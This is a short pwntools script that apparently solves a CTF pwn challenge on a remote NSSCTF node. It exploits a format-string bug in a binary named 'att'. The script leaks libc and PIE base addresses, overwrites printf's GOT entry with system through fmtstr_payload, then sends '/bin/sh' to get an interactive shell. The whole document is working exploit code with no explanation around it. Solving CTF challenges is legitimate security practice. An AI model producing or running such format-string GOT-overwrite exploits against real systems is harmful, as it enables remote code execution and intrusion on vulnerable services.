from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28430)
# io=process("./att")
elf=ELF("./att")
libc=ELF("./libc-2.23.so")


io.recvuntil(b"say: ")
payload=b"%21$p.%17$p"
io.send(payload)
io.recvuntil(b"said:")
leak_addr=int(io.recv(14),16)-240-libc.sym[b"__libc_start_main"]
print("leak_addr: "+hex(leak_addr))
sys_addr=libc.sym[b"system"]+leak_addr

io.recvuntil(b".")
g_addr=int(io.recv(14),16)-elf.sym[b"_start"]
print("g_addr: "+hex(g_addr))
printf_got=elf.got[b"printf"]+g_addr


io.recvuntil(b"say: ")
payload=fmtstr_payload(6,{printf_got:sys_addr},write_size='short')
io.sendline(payload)


# io.recvuntil(b"say: ")
io.sendline(b"/bin/sh")

io.interactive()